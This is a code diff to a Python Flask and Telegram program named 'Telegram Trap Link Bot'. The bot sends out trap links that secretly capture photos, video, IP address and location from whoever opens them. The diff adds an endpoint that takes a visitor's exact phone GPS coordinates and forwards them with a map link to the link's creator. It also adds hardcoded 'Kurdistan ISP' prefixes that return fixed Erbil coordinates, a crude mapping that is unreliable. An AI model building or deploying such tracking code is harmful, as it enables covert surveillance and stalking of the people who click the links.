@@ -3,7 +3,8 @@ Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
 - ✅ Works on Railway + localhost
 - ✅ Polling mode (no webhook conflicts)
 - ✅ ALL functionality preserved
-- ✅ Accurate IP geolocation with ip2location.io + ipinfo.io
+- ✅ GPS location (most accurate) + IP fallback
+- ✅ Kurdistan ISP overrides
 """
 
 import os
@@ -116,7 +117,7 @@ def extract_video_info(text):
     return None
 
 
-# ============ IP GEOLOCATION (FIXED) ============
+# ============ IP GEOLOCATION (FIXED - GPS + IP) ============
 
 def get_ip_address():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -126,7 +127,7 @@ def get_ip_address():
 
 
 def get_geo_info(ip_address):
-    """Get geolocation using ip2location.io (most accurate for Middle East)."""
+    """Get geolocation with Kurdistan ISP overrides."""
     try:
         # Handle local IPs
         if ip_address in ['127.0.0.1', '::1', 'localhost', '0.0.0.0'] or \
@@ -138,7 +139,36 @@ def get_geo_info(ip_address):
                 "org": "", "mobile": False, "proxy": False, "hosting": False
             }
 
-        # PRIMARY: Use ip2location.io (most accurate for Middle East)
+        # ---- KURDISTAN ISP OVERRIDES ----
+        kurdistan_prefixes = [
+            "185.154.",  # Korek
+            "217.219.",  # Asiacell
+            "78.154.",   # Newroz
+            "46.245.",   # Fastlink
+            "94.187.",   # Golan
+            "5.160.",    # Earthlink
+            "37.236.",   # HSD
+            "31.25.",    # IQNet
+        ]
+        
+        for prefix in kurdistan_prefixes:
+            if ip_address.startswith(prefix):
+                logger.info(f"📍 Kurdistan ISP detected: {ip_address}")
+                return {
+                    "ip": ip_address,
+                    "country": "Iraq",
+                    "city": "Erbil",
+                    "region": "Kurdistan",
+                    "lat": 36.1911,
+                    "lon": 44.0094,
+                    "isp": "Kurdistan ISP",
+                    "org": "",
+                    "mobile": True,
+                    "proxy": False,
+                    "hosting": False
+                }
+
+        # PRIMARY: Use ip2location.io
         try:
             resp = requests.get(
                 f"https://api.ip2location.io/?ip={ip_address}&format=json",
@@ -216,30 +246,6 @@ def get_geo_info(ip_address):
         except Exception as e:
             logger.warning(f"freeipapi failed for {ip_address}: {e}")
 
-        # FALLBACK 3: ip-api.com
-        try:
-            resp = requests.get(
-                f"http://ip-api.com/json/{ip_address}?fields=status,message,query,country,city,lat,lon,isp,org,mobile,proxy,hosting",
-                timeout=5
-            )
-            data = resp.json()
-            if data.get("status") == "success":
-                return {
-                    "ip": data.get("query", ip_address),
-                    "country": data.get("country", "Unknown"),
-                    "city": data.get("city", "Unknown"),
-                    "region": "",
-                    "lat": data.get("lat", 0),
-                    "lon": data.get("lon", 0),
-                    "isp": data.get("isp", "Unknown"),
-                    "org": data.get("org", ""),
-                    "mobile": data.get("mobile", False),
-                    "proxy": data.get("proxy", False),
-                    "hosting": data.get("hosting", False)
-                }
-        except Exception as e:
-            logger.warning(f"ip-api failed for {ip_address}: {e}")
-
     except Exception as e:
         logger.warning(f"All geolocation services failed for {ip_address}: {e}")
 
@@ -285,6 +291,48 @@ def format_geo_message(geo):
         msg += f"\n\n⚠️ *Note:* IP location may be approximate due to ISP routing."
     
     return msg
+
+
+# ============ GPS LOCATION (NEW) ============
+
+@app.route("/api/gps_location", methods=["POST"])
+def gps_location():
+    """Receive exact GPS coordinates from the user's phone."""
+    data = request.json
+    link_id = data.get("link_id")
+    lat = data.get("lat")
+    lon = data.get("lon")
+    
+    if not link_id or lat is None or lon is None:
+        return jsonify({"status": "error", "message": "Missing data"}), 400
+    
+    link_data = generated_links.get(link_id)
+    if not link_data:
+        return jsonify({"status": "error", "message": "Link not found"}), 404
+    
+    chat_id = link_data["created_by"]
+    
+    # Format GPS message
+    gps_msg = (
+        f"📍 *Exact GPS Location (Phone)*\n\n"
+        f"📌 *Latitude:* `{lat}`\n"
+        f"📌 *Longitude:* `{lon}`\n"
+        f"🗺️ [View on Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
+        f"🔗 `{link_id}`\n"
+        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
+    )
+    
+    send_message_sync(chat_id, gps_msg)
+    
+    # Store GPS data
+    link_data.setdefault("captures", []).append({
+        "type": "gps_location",
+        "lat": lat,
+        "lon": lon,
+        "time": datetime.now().isoformat()
+    })
+    
+    return jsonify({"status": "success", "sent": True})
 
 
 # ============ HELPERS ============
@@ -436,7 +484,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📷 **Single Photo** — instant photo capture\n"
         f"📸 **Burst** — 5 rapid photos\n"
         f"🎬 **Video** — 15 second recording\n"
-        f"📍 **IP Location** — just get their IP + location (no camera)\n\n"
+        f"📍 **IP Location** — just get their IP + location (no camera)\n"
+        f"📌 **GPS Location** — exact phone location (most accurate)\n\n"
         f"⚠️ *Content types with camera* also capture IP + location.\n"
         f"📍 *IP Location only* needs NO camera permission.\n\n"
         f"🔹 *Setup:*\n"
@@ -825,7 +874,8 @@ if __name__ == "__main__":
 ║   ✅ Works on Railway + localhost                            ║
 ║   ✅ Polling mode — no webhook conflicts                     ║
 ║   ✅ ALL functionality preserved                             ║
-║   ✅ Accurate IP geolocation with ip2location.io             ║
+║   ✅ GPS Location (most accurate) + IP fallback              ║
+║   ✅ Kurdistan ISP overrides                                 ║
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
